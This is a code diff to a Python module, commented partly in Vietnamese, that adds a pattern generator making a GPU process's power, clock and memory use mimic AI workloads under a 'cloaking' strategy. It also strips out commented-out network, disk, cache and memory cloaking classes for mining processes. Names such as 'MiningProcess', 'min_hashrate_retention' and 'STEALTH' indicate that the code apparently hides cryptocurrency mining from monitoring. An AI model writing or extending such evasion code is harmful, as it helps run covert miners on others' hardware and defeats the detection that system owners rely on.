@@ -332,6 +332,264 @@ class CloakCoordinator:
 #                 GPU STRATEGY: GpuCloakStrategy                              #
 ###############################################################################
 
+import math
+import json
+from collections import deque
+import os
+
+class AdaptivePatternGenerator:
+    """
+    **Adaptive Pattern Generator** (Bộ tạo pattern thích ứng – tạo mẫu biến động tự điều chỉnh)
+    Tạo các **AI-like patterns** (pattern giống AI – mẫu hoạt động như trí tuệ nhân tạo) cho GPU metrics
+    không phụ thuộc vào **GPU plugins** (plugin GPU – phần mở rộng card đồ họa)
+    """
+    
+    def __init__(self, profile: str = "medium"):
+        """
+        Initialize với **optimization profile** (hồ sơ tối ưu – cấu hình tối ưu hóa)
+        :param profile: "light", "medium", hoặc "heavy"
+        """
+        self.logger = cloak_logger
+        self.profile_name = profile
+        self.config = self._load_config()
+        self.profile = self.config['profiles'].get(profile, self.config['profiles']['medium'])
+        
+        # Pattern state tracking
+        self.cycle_position = 0
+        self.cycle_duration = self.profile['cycle_duration']
+        self.pattern_history = deque(maxlen=100)
+        self.baseline_power = None
+        self.current_phase = "warmup"
+        self.phase_timer = 0
+        
+        # Jitter và variation layers
+        self.jitter_factor = self.profile['jitter_factor']
+        self.power_variation = self.profile['power_variation']
+        
+        # Mean reversion parameters
+        self.mean_reversion_strength = 0.7
+        self.mean_reversion_threshold = 1.5
+        
+        self.logger.info(f"✅ [AdaptivePatternGenerator] Initialized với profile '{profile}'")
+    
+    def _load_config(self) -> Dict[str, Any]:
+        """
+        Load **configuration file** (file cấu hình – tệp thiết lập)
+        """
+        config_path = os.getenv('GPU_OPT_CONFIG', '/app/gpu_optimization_config.json')
+        try:
+            if os.path.exists(config_path):
+                with open(config_path, 'r') as f:
+                    return json.load(f)
+        except Exception as e:
+            self.logger.warning(f"⚠️ Cannot load config from {config_path}: {e}")
+        
+        # Default config nếu không load được
+        return {
+            'profiles': {
+                'medium': {
+                    'overhead_target': 0.12,
+                    'power_variation': 0.12,
+                    'vram_allocation': 0.50,
+                    'jitter_factor': 0.25,
+                    'cycle_duration': 90
+                }
+            },
+            'safety': {
+                'max_temperature': 78,
+                'min_hashrate_retention': 0.85,
+                'power_stddev_target': 5
+            }
+        }
+    
+    def generate_control_params(self, pid: int, current_metrics: Dict[str, Any] = None) -> Dict[str, Any]:
+        """
+        Generate **control parameters** (tham số điều khiển – thông số kiểm soát) cho mỗi cycle
+        
+        :param pid: Process ID cần apply
+        :param current_metrics: Current GPU metrics (power, temp, vram, etc.)
+        :return: Dict chứa các control parameters
+        """
+        # Update cycle position
+        self.cycle_position += 1
+        
+        # Determine current phase
+        self._update_phase()
+        
+        # Get baseline nếu chưa có
+        if self.baseline_power is None and current_metrics:
+            self.baseline_power = current_metrics.get('power', 150)
+        elif self.baseline_power is None:
+            self.baseline_power = 150  # Default 150W
+        
+        # Generate base parameters theo phase
+        base_params = {
+            'power_limit': self._calculate_power_target(),
+            'sm_clock': self._calculate_sm_clock(),
+            'memory_clock': 877,  # Keep stable
+            'temp_threshold': self.config['safety']['max_temperature'],
+            'vram_target': self._calculate_vram_target()
+        }
+        
+        # Apply multi-layer variations
+        varied_params = self._apply_variations(base_params)
+        
+        # Apply safety limits
+        safe_params = self._apply_safety_limits(varied_params, current_metrics)
+        
+        # Log pattern metrics
+        self._log_pattern_metrics(safe_params)
+        
+        return safe_params
+    
+    def _update_phase(self):
+        """
+        Update **current phase** (giai đoạn hiện tại – pha hoạt động)
+        """
+        self.phase_timer += 1
+        
+        if self.current_phase == "warmup" and self.phase_timer > 30:
+            self.current_phase = "active"
+            self.phase_timer = 0
+            self.logger.info("📈 [Pattern] Transitioned to ACTIVE phase")
+        elif self.current_phase == "active" and self.phase_timer > self.cycle_duration:
+            self.current_phase = "cooldown"
+            self.phase_timer = 0
+            self.logger.info("📉 [Pattern] Transitioned to COOLDOWN phase")
+        elif self.current_phase == "cooldown" and self.phase_timer > 20:
+            self.current_phase = "active"
+            self.phase_timer = 0
+            self.logger.info("📈 [Pattern] Returned to ACTIVE phase")
+    
+    def _calculate_power_target(self) -> int:
+        """
+        Calculate **power target** (mục tiêu công suất – đích năng lượng) với mean-reverting random walk
+        """
+        base = self.baseline_power
+        variation = self.power_variation
+        
+        if self.current_phase == "warmup":
+            # Tăng dần từ 90% → 100%
+            progress = min(1.0, self.phase_timer / 30)
+            return int(base * (0.9 + 0.1 * progress))
+            
+        elif self.current_phase == "active":
+            # Sinusoidal với jitter
+            t = self.cycle_position
+            sine = math.sin(2 * math.pi * t / 60)  # 60s period
+            jitter = random.gauss(0, variation * 0.2)
+            
+            # Mean reversion
+            target = base * (1 + variation * sine + jitter)
+            if abs(target - base) > base * variation * self.mean_reversion_threshold:
+                target = base + (target - base) * self.mean_reversion_strength
+                
+            return int(target)
+            
+        else:  # cooldown
+            # Giảm dần về 95%
+            return int(base * 0.95)
+    
+    def _calculate_sm_clock(self) -> int:
+        """
+        Calculate **SM clock target** (mục tiêu xung nhịp SM – tần số streaming multiprocessor)
+        """
+        base_clock = 1400  # Base SM clock
+        
+        if self.current_phase == "active":
+            # Vary clock với pattern khác power
+            t = self.cycle_position
+            sine = math.sin(2 * math.pi * t / 45 + math.pi/4)  # Different phase
+            variation = self.jitter_factor * 0.1  # 10% of jitter factor
+            
+            target = base_clock * (1 + variation * sine)
+            return int(target)
+        
+        return base_clock
+    
+    def _calculate_vram_target(self) -> float:
+        """
+        Calculate **VRAM allocation target** (mục tiêu phân bổ VRAM – đích bộ nhớ video)
+        """
+        base_allocation = self.profile['vram_allocation']
+        
+        if self.current_phase == "active":
+            # Rotating allocation pattern
+            rotation = (self.cycle_position // 60) % 3
+            variations = [0.9, 1.0, 1.1]
+            return base_allocation * variations[rotation]
+        
+        return base_allocation
+    
+    def _apply_variations(self, params: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Apply **multi-layer jitter** (jitter đa tầng – nhiễu nhiều lớp) và variations
+        """
+        # Layer 1: Frequency jitter (±20%)
+        freq_jitter = random.uniform(0.8, 1.2)
+        
+        # Layer 2: Amplitude jitter (±15%)  
+        amp_jitter = random.uniform(0.85, 1.15)
+        
+        # Layer 3: Phase shift mỗi 10-20 cycles
+        if random.random() < 0.05:  # 5% chance
+            phase_shift = random.uniform(-10, 10)
+            if 'power_limit' in params:
+                params['power_limit'] += phase_shift
+                
+        # Layer 4: Random micro-noise (±2%)
+        for key in ['power_limit', 'sm_clock']:
+            if key in params and params[key]:
+                noise = random.uniform(0.98, 1.02)
+                params[key] = int(params[key] * noise * amp_jitter)
+                
+        return params
+    
+    def _apply_safety_limits(self, params: Dict[str, Any], current_metrics: Dict[str, Any] = None) -> Dict[str, Any]:
+        """
+        Apply **safety limits** (giới hạn an toàn – ngưỡng bảo vệ) dựa trên current metrics
+        """
+        safety = self.config.get('safety', {})
+        
+        # Temperature-based throttling
+        if current_metrics and 'temperature' in current_metrics:
+            temp = current_metrics['temperature']
+            max_temp = safety.get('max_temperature', 78)
+            
+            if temp > max_temp:
+                # Reduce power proportionally
+                reduction = min(0.3, (temp - max_temp) / 10)
+                params['power_limit'] = int(params['power_limit'] * (1 - reduction))
+                self.logger.warning(f"🌡️ High temp {temp}°C, reducing power by {reduction*100:.0f}%")
+        
+        # Ensure minimum power
+        if params['power_limit'] < 50:
+            params['power_limit'] = 50
+        
+        # Ensure valid clocks
+        if params['sm_clock'] < 300:
+            params['sm_clock'] = 300
+        elif params['sm_clock'] > 2100:
+            params['sm_clock'] = 2100
+            
+        return params
+    
+    def _log_pattern_metrics(self, params: Dict[str, Any]):
+        """
+        Log **pattern metrics** (chỉ số pattern – thông số mẫu) để monitoring
+        """
+        self.pattern_history.append({
+            'timestamp': time.time(),
+            'phase': self.current_phase,
+            'params': params.copy()
+        })
+        
+        # Log mỗi 30 entries
+        if len(self.pattern_history) % 30 == 0:
+            avg_power = sum(p['params'].get('power_limit', 0) for p in self.pattern_history) / len(self.pattern_history)
+            self.logger.info(f"📊 [Pattern Stats] Phase: {self.current_phase}, Avg Power: {avg_power:.1f}W")
+
+
 class GpuCloakStrategy:
     """
     ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management:
@@ -372,6 +630,16 @@ class GpuCloakStrategy:
         self.logger = logger
         self.config = config
         self.hw_controller = hw_controller  # NEW: Store HardwareController reference
+        
+        # ✅ GPU OPTIMIZATION: Initialize AdaptivePatternGenerator nếu enabled
+        gpu_opt_enabled = os.getenv('GPU_OPT_ENABLED', '0') == '1'
+        if gpu_opt_enabled:
+            gpu_opt_profile = os.getenv('GPU_OPT_PROFILE', 'medium')
+            self.pattern_generator = AdaptivePatternGenerator(profile=gpu_opt_profile)
+            self.logger.info(f"🎯 [GPU OPTIMIZATION] Enabled với profile '{gpu_opt_profile}'")
+        else:
+            self.pattern_generator = None
+            self.logger.info("🔧 [GPU OPTIMIZATION] Disabled - using standard cloaking")
 
         # ✅ MULTI-LEVEL FALLBACK MECHANISM: 3 layers of GPU manager creation
         if gpu_resource_manager:
@@ -448,6 +716,20 @@ class GpuCloakStrategy:
         params = request.get('params', {})
         
         try:
+            # ✅ GPU OPTIMIZATION: Sử dụng AdaptivePatternGenerator nếu enabled
+            if self.pattern_generator:
+                # Lấy current metrics nếu có
+                current_metrics = self._get_current_gpu_metrics()
+                
+                # Generate adaptive control parameters
+                adaptive_params = self.pattern_generator.generate_control_params(pid, current_metrics)
+                
+                # Merge với existing params
+                params.update(adaptive_params)
+                self.logger.debug(f"🎯 [Pattern] Applied adaptive params: {adaptive_params}")
+                
+                # Store generated params cho monitoring
+                self._store_pattern_metrics(adaptive_params)
             # 1️⃣ PROCESS FILTERING (Logic GPUResourceManager thiếu)
             if self.allowed_process_name:
                 # TODO: Get process name from pid and filter
@@ -576,13 +858,97 @@ class GpuCloakStrategy:
         Phát hiện số lượng GPU trong hệ thống
         """
         try:
-            if self.gpu_resource_manager:
-                return self.gpu_resource_manager.get_gpu_count()
-            # Fallback detection (could use nvidia-smi or pynvml)
-            return 1  # Default to single GPU
+            # Try NVML first (most reliable)
+            import pynvml
+            pynvml.nvmlInit()
+            count = pynvml.nvmlDeviceGetCount()
+            pynvml.nvmlShutdown()
+            return count
+        except Exception:
+            # Fallback to nvidia-smi
+            try:
+                result = os.popen("nvidia-smi -L | wc -l").read()
+                return int(result.strip())
+            except:
+                return 1  # Default to 1 GPU
+    
+    def _get_current_gpu_metrics(self) -> Dict[str, Any]:
+        """
+        ✅ GPU OPTIMIZATION: Lấy current GPU metrics để feed vào pattern generator
+        """
+        metrics = {}
+        try:
+            # Try NVML để lấy real metrics
+            import pynvml
+            pynvml.nvmlInit()
+            handle = pynvml.nvmlDeviceGetHandleByIndex(0)  # GPU 0
+            
+            # Power usage
+            power = pynvml.nvmlDeviceGetPowerUsage(handle) / 1000  # mW to W
+            metrics['power'] = power
+            
+            # Temperature
+            temp = pynvml.nvmlDeviceGetTemperature(handle, pynvml.NVML_TEMPERATURE_GPU)
+            metrics['temperature'] = temp
+            
+            # Memory info
+            mem_info = pynvml.nvmlDeviceGetMemoryInfo(handle)
+            metrics['vram_used'] = mem_info.used / (1024**3)  # bytes to GB
+            metrics['vram_total'] = mem_info.total / (1024**3)
+            
+            # Clock speeds
+            sm_clock = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_SM)
+            metrics['sm_clock'] = sm_clock
+            
+            pynvml.nvmlShutdown()
+            
         except Exception as e:
-            self.logger.warning(f"⚠️ [DETECT] GPU count detection failed: {e}, defaulting to 1")
-            return 1
+            self.logger.debug(f"⚠️ Cannot get GPU metrics via NVML: {e}")
+            # Return default metrics
+            metrics = {
+                'power': 150,
+                'temperature': 65,
+                'vram_used': 4.0,
+                'vram_total': 8.0,
+                'sm_clock': 1400
+            }
+        
+        return metrics
+    
+    def _store_pattern_metrics(self, params: Dict[str, Any]):
+        """
+        ✅ GPU OPTIMIZATION: Store pattern metrics cho monitoring và analysis
+        """
+        try:
+            # Store trong memory buffer hoặc file
+            metrics_file = '/tmp/gpu_pattern_metrics.json'
+            
+            # Load existing metrics
+            existing = []
+            if os.path.exists(metrics_file):
+                try:
+                    with open(metrics_file, 'r') as f:
+                        existing = json.load(f)
+                except:
+                    existing = []
+            
+            # Append new metrics với timestamp
+            new_entry = {
+                'timestamp': time.time(),
+                'params': params
+            }
+            existing.append(new_entry)
+            
+            # Keep only last 1000 entries
+            if len(existing) > 1000:
+                existing = existing[-1000:]
+            
+            # Save back
+            with open(metrics_file, 'w') as f:
+                json.dump(existing, f)
+                
+        except Exception as e:
+            self.logger.debug(f"⚠️ Cannot store pattern metrics: {e}")
     
     def _delegate_with_fallback(self, params: Dict[str, Any]) -> Dict[str, Any]:
         """
@@ -593,23 +959,33 @@ class GpuCloakStrategy:
             # Try primary delegation to HardwareController
             self.logger.debug(f"🎯 [DELEGATE] Forwarding to HardwareController with params: {params}")
             
-            # Import CloakResult to handle response
-            from .resource_control import CloakResult
+            if self.hw_controller:
+                # Import CloakResult to handle response
+                from .resource_control import CloakResult
+                
+                # Call HardwareController's apply_gpu_controls
+                result = self.hw_controller.apply_gpu_controls(params)
+                
+                # Process result
+                if hasattr(result, 'success'):
+                    return {
+                        'success': result.success,
+                        'message': getattr(result, 'message', 'GPU controls applied via HardwareController'),
+                        'applied_params': params,
+                        'method': 'hardware_controller'
+                    }
+                
+                # If result doesn't have success attribute, assume success
+                return {'success': True, 'applied_params': params, 'method': 'hardware_controller'}
             
-            # Call HardwareController's apply_gpu_controls
-            result = self.hw_controller.apply_gpu_controls(params)
+            # If no HardwareController, try GPU manager
+            if self.gpu_resource_manager:
+                self.logger.info("🔄 [FALLBACK] Using direct GPU manager")
+                return self._direct_gpu_apply(params)
             
-            # Process result
-            if hasattr(result, 'success'):
-                return {
-                    'success': result.success,
-                    'message': getattr(result, 'message', 'GPU controls applied via HardwareController'),
-                    'applied_params': params,
-                    'method': 'hardware_controller'
-                }
-            
-            # If result doesn't have success attribute, assume success
-            return {'success': True, 'applied_params': params, 'method': 'hardware_controller'}
+            # Final fallback - report failure
+            self.logger.error("❌ [FALLBACK] No delegation mechanisms available")
+            return {'success': False, 'error': 'No delegation mechanisms available', 'method': 'none'}
             
         except Exception as e:
             self.logger.warning(f"⚠️ [FALLBACK] Primary delegation failed: {e}")
@@ -715,616 +1091,6 @@ class GpuCloakStrategy:
         except Exception as e:
             self.logger.warning(f"⚠️ [STEALTH] Random sleep failed: {e}, continuing without delay")
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-###############################################################################
-#            NETWORK STRATEGY: NetworkCloakStrategy                           #
-###############################################################################
-
-# class NetworkCloakStrategy:
-#     """
-#     ✅ ENHANCED: Cloaking mạng cho comprehensive multi-strategy environment:
-#       - Đánh dấu pid bằng iptables,
-#       - Giới hạn băng thông (tc).
-    
-#     Enhanced cho comprehensive cloaking với network isolation.
-#     """
-    
-#     strategy_type = StrategyType.NETWORK
-#     requires_plugin_system = False  # Network strategies execute directly
-    
-#     # ✅ NEW: Comprehensive cloaking attributes
-#     is_primary_strategy = False  # Network is SECONDARY strategy
-#     coordination_priority = 70  # Medium-high priority
-#     resource_conflicts = []  # No direct conflicts with other strategies
-#     depends_on_strategies = []  # Independent of other strategies
-#     supports_concurrent_application = True  # Safe to apply with any other strategy
-#     estimated_application_time_ms = 200  # iptables + tc commands ~200ms
-
-#     def __init__(
-#         self,
-#         config: Dict[str, Any],
-#         logger: logging.Logger,
-#         network_resource_manager: NetworkResourceManager
-#     ):
-#         """
-#         Khởi tạo NetworkCloakStrategy.
-
-#         :param config: Cấu hình cloaking Network (dict).
-#         :param logger: Logger.
-#         :param network_resource_manager: ResourceManager liên quan đến Network.
-#         """
-#         self.logger = logger
-#         self.config = config
-#         self.network_resource_manager = cast(Any, network_resource_manager)
-
-#         self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 700)
-#         if self.bandwidth_reduction_mbps <= 0:
-#             self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=500.")
-#             self.bandwidth_reduction_mbps = 700
-
-#         self.network_interface = config.get('network_interface') or "eth0"
-#         self.process_marks: Dict[int, int] = {}
-
-#     def apply(self, process: MiningProcess) -> bool:
-#         """
-#         ✅ ENHANCED: Áp dụng network cloaking với return value validation.
-        
-#         :param process: Đối tượng MiningProcess.
-#         :return: bool - True nếu network cloaking áp dụng thành công, False nếu thất bại
-#         """
-#         try:
-#             pid, name = process.pid, process.name
-#             mark = pid % 32768  # Dùng pid để tạo mark
-
-#             ok_mark = self.network_resource_manager.mark_packets(pid, mark)
-#             if not ok_mark:
-#                 self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
-#                 return False  # ✅ FAILURE: Cannot mark packets
-
-#             ok_limit = self.network_resource_manager.limit_bandwidth(
-#                 self.network_interface, mark, self.bandwidth_reduction_mbps
-#             )
-#             if not ok_limit:
-#                 self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
-#                 return False  # ✅ FAILURE: Cannot limit bandwidth
-
-#             self.process_marks[pid] = mark
-#             self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")
-
-#             # Rollback mark_packets
-#             self.network_resource_manager.unmark_packets(pid, mark)
-#             return True  # ✅ SUCCESS: Network cloaking applied successfully
-
-#         except psutil.NoSuchProcess as e:
-#             # ✅ ERROR REPORTING: Process not found error
-#             error_reporter.report_error(
-#                 ErrorCode.PROCESS_NOT_FOUND,
-#                 f"Net Cloaking: Tiến trình không tồn tại: {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='NetworkCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='Network',
-#                 context_data={'process_name': process.name, 'error': str(e)},
-#                 exception=e
-#             )
-#             self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
-#             return False  # ✅ FAILURE: Process does not exist
-#         except psutil.AccessDenied as e:
-#             # ✅ ERROR REPORTING: Access denied error
-#             error_reporter.report_error(
-#                 ErrorCode.PROCESS_ACCESS_DENIED,
-#                 f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='NetworkCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='Network',
-#                 context_data={'process_name': process.name, 'error': str(e)},
-#                 exception=e
-#             )
-#             self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
-#             return False  # ✅ FAILURE: Access denied
-#         except Exception as e:
-#             # ✅ ERROR REPORTING: General strategy application failure
-#             error_reporter.report_error(
-#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
-#                 f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='NetworkCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='Network',
-#                 context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
-#                 exception=e
-#             )
-#             self.logger.error(
-#                 f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-#             )
-#             return False  # ✅ FAILURE: Network cloaking failed
-
-#     def restore(self, process: MiningProcess) -> None:
-#         """
-#         Khôi phục Network - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-#         """
-#         self.logger.info(f"[NETWORK RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
-
-###############################################################################
-#            DISK IO STRATEGY: DiskIoCloakStrategy                            #
-###############################################################################
-# class DiskIoCloakStrategy:
-#     """
-#     Cloaking Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O (tuỳ triển khai).
-    
-#     Redesigned theo blueprint với direct execution.
-#     """
-    
-#     strategy_type = StrategyType.DISK_IO
-#     requires_plugin_system = False  # Disk I/O strategies execute directly
-
-#     def __init__(
-#         self,
-#         config: Dict[str, Any],
-#         logger: logging.Logger,
-#         disk_io_resource_manager: DiskIOResourceManager
-#     ):
-#         """
-#         Khởi tạo DiskIoCloakStrategy.
-
-#         :param config: Cấu hình cloaking Disk IO (dict).
-#         :param logger: Logger.
-#         :param disk_io_resource_manager: ResourceManager liên quan đến Disk I/O.
-#         """
-#         self.logger = logger
-#         self.config = config
-#         self.disk_io_resource_manager = cast(Any, disk_io_resource_manager)
-
-#         self.io_weight = config.get('io_weight', 3)
-#         if not isinstance(self.io_weight, int) or not (0 <= self.io_weight <= 7):
-#             self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
-#             self.io_weight = 3
-
-#     def apply(self, process: MiningProcess) -> bool:
-#         """
-#         ✅ ENHANCED: Áp dụng Disk I/O cloaking với return value validation.
-
-#         :param process: Đối tượng MiningProcess.
-#         :return: bool - True nếu Disk I/O cloaking áp dụng thành công, False nếu thất bại
-#         """
-#         try:
-#             pid, name = process.pid, process.name
-#             ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
-#             if ok:
-#                 self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
-#                 return True  # ✅ SUCCESS: Disk I/O cloaking applied successfully
-#             else:
-#                 self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
-#                 return False  # ✅ FAILURE: Cannot set I/O weight
-#         except psutil.NoSuchProcess as e:
-#             # ✅ ERROR REPORTING: Process not found error
-#             error_reporter.report_error(
-#                 ErrorCode.PROCESS_NOT_FOUND,
-#                 f"DiskIO Cloaking: Tiến trình không tồn tại: {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='DiskIoCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='DiskIO',
-#                 context_data={'process_name': process.name, 'error': str(e)},
-#                 exception=e
-#             )
-#             self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
-#             return False  # ✅ FAILURE: Process does not exist
-#         except psutil.AccessDenied as e:
-#             # ✅ ERROR REPORTING: Access denied error
-#             error_reporter.report_error(
-#                 ErrorCode.PROCESS_ACCESS_DENIED,
-#                 f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='DiskIoCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='DiskIO',
-#                 context_data={'process_name': process.name, 'error': str(e)},
-#                 exception=e
-#             )
-#             self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
-#             return False  # ✅ FAILURE: Access denied
-#         except Exception as e:
-#             # ✅ ERROR REPORTING: General strategy application failure
-#             error_reporter.report_error(
-#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
-#                 f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='DiskIoCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='DiskIO',
-#                 context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
-#                 exception=e
-#             )
-#             self.logger.error(
-#                 f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-#             )
-#             return False  # ✅ FAILURE: Disk I/O cloaking failed
-
-#     def restore(self, process: MiningProcess) -> None:
-#         """
-#         Khôi phục DiskIO - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-#         """
-#         self.logger.info(f"[DISKIO RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
-
-###############################################################################
-#            CACHE STRATEGY: CacheCloakStrategy                               #
-###############################################################################
-# class CacheCloakStrategy:
-#     """
-#     Cloaking Cache (đồng bộ):
-#       - Drop caches,
-#       - Giới hạn cache usage.
-    
-#     Redesigned theo blueprint với direct execution.
-#     """
-    
-#     strategy_type = StrategyType.CACHE
-#     requires_plugin_system = False  # Cache strategies execute directly
-
-#     def __init__(
-#         self,
-#         config: Dict[str, Any],
-#         logger: logging.Logger,
-#         cache_resource_manager: CacheResourceManager
-#     ):
-#         """
-#         Khởi tạo CacheCloakStrategy.
-
-#         :param config: Cấu hình cloaking Cache (dict).
-#         :param logger: Logger.
-#         :param cache_resource_manager: ResourceManager liên quan đến Cache.
-#         """
-#         self.logger = logger
-#         self.config = config
-#         self.cache_resource_manager = cast(Any, cache_resource_manager)
-
-#         self.cache_limit_percent = config.get('cache_limit_percent', 50)
-#         if not (0 <= self.cache_limit_percent <= 100):
-#             self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
-#             self.cache_limit_percent = 50
-
-#     def apply(self, process: MiningProcess) -> bool:
-#         """
-#         ✅ ENHANCED: Áp dụng Cache cloaking với return value validation.
-
-#         :param process: Đối tượng MiningProcess.
-#         :return: bool - True nếu Cache cloaking áp dụng thành công, False nếu thất bại
-#         """
-#         try:
-#             pid, name = process.pid, process.name
-#             ok = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent, pid)
-#             if ok:
-#                 self.logger.info(f"[Cache Cloaking] PID={pid}, cache_limit={self.cache_limit_percent}%.")
-#                 return True  # ✅ SUCCESS: Cache cloaking applied successfully
-#             else:
-#                 self.logger.error(f"[Cache Cloaking] Không thể set cache_limit cho PID={pid}.")
-#                 return False  # ✅ FAILURE: Cannot set cache limit
-#         except psutil.NoSuchProcess as e:
-#             # ✅ ERROR REPORTING: Process not found error
-#             error_reporter.report_error(
-#                 ErrorCode.PROCESS_NOT_FOUND,
-#                 f"Cache Cloaking: Tiến trình không tồn tại: {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='CacheCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='Cache',
-#                 context_data={'process_name': process.name, 'error': str(e)},
-#                 exception=e
-#             )
-#             self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
-#             return False  # ✅ FAILURE: Process does not exist
-#         except psutil.AccessDenied as e:
-#             # ✅ ERROR REPORTING: Access denied error
-#             error_reporter.report_error(
-#                 ErrorCode.PROCESS_ACCESS_DENIED,
-#                 f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='CacheCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='Cache',
-#                 context_data={'process_name': process.name, 'error': str(e)},
-#                 exception=e
-#             )
-#             self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
-#             return False  # ✅ FAILURE: Access denied
-#         except Exception as e:
-#             # ✅ ERROR REPORTING: General strategy application failure
-#             error_reporter.report_error(
-#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
-#                 f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}",
-#                 ErrorSeverity.HIGH,
-#                 module='cloak_strategies',
-#                 function='CacheCloakStrategy.apply',
-#                 process_id=process.pid,
-#                 strategy_name='Cache',
-#                 context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
-#                 exception=e
-#             )
-#             self.logger.error(
-#                 f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-#             )
-#             return False  # ✅ FAILURE: Cache cloaking failed
-
-#     def restore(self, process: MiningProcess) -> None:
-#         """
-#         Khôi phục Cache - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-#         """
-#         self.logger.info(f"[CACHE RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
-
-###############################################################################
-#            MEMORY STRATEGY: MemoryCloakStrategy                             #
-###############################################################################
-# class MemoryCloakStrategy:
-#     """
-#     Cloaking Memory (đồng bộ):
-#       - Giới hạn Memory usage.
-    
-#     Redesigned theo blueprint với direct execution.
-#     """
-    
-#     strategy_type = StrategyType.MEMORY
-#     requires_plugin_system = False  # Memory strategies execute directly
-
-#     def __init__(
-#         self,
-#         config: Dict[str, Any],
-#         logger: logging.Logger,
-#         memory_resource_manager: MemoryResourceManager,
-#         cache_resource_manager: CacheResourceManager
-#     ):
-#         """
-#         Khởi tạo MemoryCloakStrategy.
-
-#         :param config: Cấu hình cloaking Memory (dict).
-#         :param logger: Logger.
-#         :param memory_resource_manager: ResourceManager liên quan đến Memory.
-#         :param cache_resource_manager: ResourceManager liên quan đến Cache.
-#         """
-#         self.logger = logger
-#         self.config = config
-#         self.memory_resource_manager = cast(Any, memory_resource_manager)
-#         self.cache_resource_manager = cast(Any, cache_resource_manager)
-
-#         # ✅ SMART MEMORY: GPU-aware memory allocation
-#         self.gpu_aware = config.get('gpu_aware', True)
-#         self.smart_mode = config.get('smart_mode', True)
-        
-#         # Dynamic memory based on process type
-#         base_memory = config.get('memory_limit_mb', 6144)
-#         if self.gpu_aware and self.smart_mode:
-#             # Enhanced memory for GPU processes
-#             self.memory_limit_mb = base_memory
-#             self.logger.info(f"🧠 [SMART MEMORY] GPU-aware mode: {self.memory_limit_mb}MB allocation")
-#         else:
-#             self.memory_limit_mb = base_memory
-            
-#         if self.memory_limit_mb <= 0:
-#             self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=6144.")
-#             self.memory_limit_mb = 6144
-
-#     def apply(self, process: MiningProcess) -> bool:
-#         """
-#         ✅ ENHANCED: Áp dụng Memory cloaking với return value validation.
-
-#         :param process: Đối tượng MiningProcess.
-#         :return: bool - True nếu Memory cloaking áp dụng thành công, False nếu thất bại
-#         """
-#         try:
